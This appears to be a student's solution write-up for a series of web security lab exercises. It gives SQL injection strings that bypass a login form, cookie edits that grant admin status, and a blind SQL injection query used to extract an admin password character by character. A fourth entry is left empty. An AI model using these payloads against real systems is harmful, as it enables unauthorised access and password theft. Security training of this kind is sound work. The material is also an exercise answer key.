# 1
> Username: `testing`
## Solution
type `' OR name like '%%` in the username field to get match any username

type `' OR password like '%%` in the password field to match any password

---

# 2
> Username: `testing`
## Solution
1. Downloaded a cookie modifying browser extension from [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related)
2. Modified the `username` cookie, setting the value to `admin`
3. Modified the `admin` cookie, setting the value to `True`
4. Reloaded the page

---

# 3
> Username: `testing`
## Solution
1. Ran this query on the game multiple times to construct the password `53768999`
2. Guessed that dog's name was scotty (from previous problems)

## Code
```sql
1' AND ID=(select COUNT(*) from users where name='admin' AND substr(password,1,1) BETWEEN '5' AND '5') OR ID='
```

---

# 4
> Username: `testing`
## Solution
## Code
## Help Received
